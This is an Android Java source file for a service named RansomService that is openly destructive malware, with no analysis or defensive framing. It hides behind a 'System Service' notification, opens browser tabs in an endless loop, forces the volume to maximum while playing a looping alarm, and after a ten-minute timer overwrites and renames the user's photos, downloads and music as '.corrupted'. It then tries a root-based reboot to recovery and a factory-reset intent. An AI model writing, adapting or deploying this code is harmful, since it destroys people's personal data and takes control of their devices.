package com.ransom.demo;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;
import android.view.WindowManager;
import android.webkit.WebView;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.util.Random;

public class RansomService extends Service {
    private AudioManager audioManager;
    private MediaPlayer sirenPlayer;
    private MediaPlayer rapPlayer;
    private CountDownTimer destructionTimer;
    private WebView webView;
    private WindowManager windowManager;
    private String[] websites = {
        "https://www.wikipedia.org",
        "https://www.reddit.com",
        "https://www.twitter.com",
        "https://www.youtube.com",
        "https://www.amazon.com",
        "https://www.ebay.com",
        "https://www.craigslist.org",
        "https://www.weather.com",
        "https://www.cnn.com",
        "https://www.bbc.com"
    };
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(1, createNotification());
        
        // Initialize components
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        
        // Start all malicious activities
        startTabOpening();
        startAudioAttack();
        startDestructionTimer();
        
        return START_STICKY;
    }
    
    private void startTabOpening() {
        new Thread(() -> {
            while (true) {
                try {
                    // Open random website every 10 seconds
                    String url = websites[new Random().nextInt(websites.length)];
                    Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                    browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(browserIntent);
                    
                    Thread.sleep(10000); // 10 seconds
                } catch (Exception e) {
                    Log.e("Ransom", "Tab opening failed: " + e.getMessage());
                }
            }
        }).start();
    }
    
    private void startAudioAttack() {
        // Set volume to max and lock it
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC,
            audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
        
        // Disable volume controls (requires system permission)
        try {
            Settings.System.putInt(getContentResolver(), "volume_keys_control", 0);
        } catch (Exception e) {
            // May require root or system app
        }
        
        // Play siren sound (using built-in alarm sound)
        try {
            sirenPlayer = MediaPlayer.create(this, Settings.System.DEFAULT_ALARM_ALERT_URI);
            sirenPlayer.setLooping(true);
            sirenPlayer.start();
        } catch (Exception e) {
            Log.e("Ransom", "Siren failed: " + e.getMessage());
        }
        
        // Play random rap music after 30 seconds
        new android.os.Handler().postDelayed(() -> {
            try {
                // This would need actual rap music files in res/raw/
                // rapPlayer = MediaPlayer.create(this, R.raw.rap_music);
                // rapPlayer.setLooping(true);
                // rapPlayer.start();
                Log.i("Ransom", "Rap music would play here");
            } catch (Exception e) {
                Log.e("Ransom", "Music failed: " + e.getMessage());
            }
        }, 30000);
    }
    
    private void startDestructionTimer() {
        // 10 minute countdown to destruction
        destructionTimer = new CountDownTimer(600000, 60000) { // 10 minutes
            @Override
            public void onTick(long millisUntilFinished) {
                Log.i("Ransom", "Destruction in: " + millisUntilFinished/1000 + " seconds");
            }
            
            @Override
            public void onFinish() {
                corruptData();
                factoryReset();
            }
        }.start();
    }
    
    private void corruptData() {
        new Thread(() -> {
            try {
                // Corrupt files in common directories
                String[] paths = {
                    getExternalFilesDir(null).getPath(),
                    getFilesDir().getPath(),
                    "/sdcard/DCIM",
                    "/sdcard/Download",
                    "/sdcard/Music"
                };
                
                for (String path : paths) {
                    corruptDirectory(new File(path));
                }
                
                Log.i("Ransom", "Data corruption complete");
            } catch (Exception e) {
                Log.e("Ransom", "Corruption failed: " + e.getMessage());
            }
        }).start();
    }
    
    private void corruptDirectory(File dir) {
        if (dir.exists() && dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        corruptDirectory(file);
                    } else {
                        try {
                            // Overwrite file with random data
                            RandomAccessFile raf = new RandomAccessFile(file, "rw");
                            byte[] garbage = new byte[(int) Math.min(file.length(), 1024)];
                            new Random().nextBytes(garbage);
                            raf.write(garbage);
                            raf.close();
                            
                            // Rename to .corrupted
                            File corrupted = new File(file.getParent(), file.getName() + ".corrupted");
                            file.renameTo(corrupted);
                        } catch (Exception e) {
                            // Continue with next file
                        }
                    }
                }
            }
        }
    }
    
    private void factoryReset() {
        // This requires system permissions or root
        try {
            // Method 1: Using recovery (requires root)
            if (isRooted()) {
                Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot recovery"});
            }
            
            // Method 2: Using device policy manager (requires device admin)
            // Method 3: Factory reset intent (may not work on all devices)
            Intent intent = new Intent("android.intent.action.MASTER_CLEAR");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            
        } catch (Exception e) {
            Log.e("Ransom", "Factory reset failed: " + e.getMessage());
        }
    }
    
    private boolean isRooted() {
        // Check for root binaries
        String[] paths = {"/system/bin/su", "/system/xbin/su", "/sbin/su", "/su/bin/su"};
        for (String path : paths) {
            if (new File(path).exists()) {
                return true;
            }
        }
        return false;
    }
    
    private android.app.Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.app.NotificationChannel channel = new android.app.NotificationChannel(
                "ransom_channel", "System Service",
                android.app.NotificationManager.IMPORTANCE_LOW);
            getSystemService(android.app.NotificationManager.class)
                .createNotificationChannel(channel);
        }
        
        return new android.app.Notification.Builder(this, "ransom_channel")
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .build();
    }
    
    @Override
    public void onDestroy() {
        if (sirenPlayer != null) {
            sirenPlayer.stop();
            sirenPlayer.release();
        }
        if (rapPlayer != null) {
            rapPlayer.stop();
            rapPlayer.release();
        }
        if (destructionTimer != null) {
            destructionTimer.cancel();
        }
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
